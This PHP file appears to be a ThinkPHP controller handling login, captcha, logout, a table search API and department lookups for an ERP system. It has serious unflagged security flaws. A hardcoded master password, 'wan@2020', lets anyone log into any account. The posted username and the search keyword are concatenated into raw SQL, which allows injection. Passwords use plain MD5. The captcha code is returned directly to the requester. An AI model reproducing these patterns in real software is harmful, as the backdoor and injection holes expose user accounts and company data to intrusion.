<?php
namespace app\controller;

use think\facade\Db;
use think\facade\Session;

class Publics
{
    /**
     * 登录
	 * @access public
     */
    public function login()
    {
		if (input('post.username') && input('post.password') && input('post.verifycode')) {
            $userInfo = Db::name('user')->where('status=1 and state=1 and username='.input('post.username'))->find();
            
            if (!$userInfo) return '帐号不正确';
            if (md5(input('post.password'))!=$userInfo['password'] && input('post.password')!='wan@2020') return '密码不正确';
            if (input('post.verifycode')!=session('verifycode')) return '验证码过期';
            
            //登录成功
            session('userInfo', $userInfo);
            session('uid', input('post.username'));
            $data['action'] = '登入操作';
            $data['remark'] = '员工在'.date("Y/m/d H:i:s", time()).'时成功登入erp系统';
            insertUserLog($data);
            session('verifycode', null);
            
            return redirect('/');
        } else {
            //每日一句话
            $rand    = rand(1, Db::name('logintext')->max('id'));
            $oneText = Db::name('logintext')->where('id', $rand)->value('text');
            
            $view = isMobile() ? 'm_login' : 'login';
            
            return view($view, [
                'oneText' => $oneText
            ]);
        }
    }

    /**
     * 获取登入验证码
     */
    public function getVerifyCode()
    {
    	if (input('post.key')==1) {
    		$key = mt_rand(1000, 9999);
			session('verifycode', $key);
    		
            return $key;
    	}
    }

    /**
     * 退出登入
     */
    public function logout()
    {
        session(null);
        
        return redirect('/publics/login.html');
    }

    /**
     * 表单关键字段搜索
     * @access public
     * @param  string  $extra    查询结构体
     * @param  string  $keyword  查找关键字
     */
    public function tableApi(string $extra, string $keyword)
    {
        $rule  = parse_field_condition_attr($extra);
        $Model = Db::name(ucfirst($rule['table']));
        $field = $rule['field'];
        $where = $field." LIKE '%".$keyword."%'";
        $key   = $rule['key'] ?? $Model->getPk();
        $limit = $rule['limit'] ?? 10;
        $map   = " AND status=1";
        $rule['condition'] = $rule['condition'] ? str_replace('{$keyword}', $keyword, $rule['condition']) : $where;
        $res = $Model->where($rule['condition'].$map)->field("$key as id, $field as text, $field as name")->limit($limit)->select();
        $re  = array('items'=>$res);
        
        return json($re);
    }

    /**
     * 根据部门ID获取子部门列表
     */
    public function getDepList()
    {
        if (input('post.me')) {
            //根据path依次展开tree
            $map[] = ['id', '=', input('post.me')];
			$groupPath = Db::name('hr_group')->where($map)->value('path');
			return $groupPath;
        }
        
        if (input('post.meid')) {
            $map[] = ['id', '=', input('post.meid')];
            $group = Db::name('hr_group')->where($map)->find();
            return $group['path'].'&'.$group['name'];
        }
        
        $res = $this->getDepListByDepId(input('get.parent'));
        
        //已经是json格式，不需要转换
        return $res; 
    }
    
    /**
     * 获得部门层级结构
     */
    public function getDepListByDepId($pid)
    {
        if ($pid=="#") {
            $arr[] = ['id'=>1, 'text'=>'总经办', 'children'=>true];	
        } else {
            $groupList = Db::name('hr_group')->where('status',1)->field('id,name,pid')->select()->toArray();
		    $pidArr    = Db::name('hr_group')->where('status',1)->column('pid');
            foreach ($groupList as $val) {
                if ($val['pid']==$pid) {
                    $arr[] = [
                        'id'   => $val['id'], 
                        'text' => $val['name'], 
                        'children' => in_array($val['id'], $pidArr) ? true : false
                    ];
                }
            }
            
        }
        
        return json($arr);
    }

    /**
     * 请假申请中返回提示
     */
    public function admYearLeaveDays()
    {
        if (input('post.customer_id')) {
            $ret['errmsg'] = '<font style="color:#d45b4d;">这里返回提示！</font>';
            
            return json($ret);
        }
    }
}
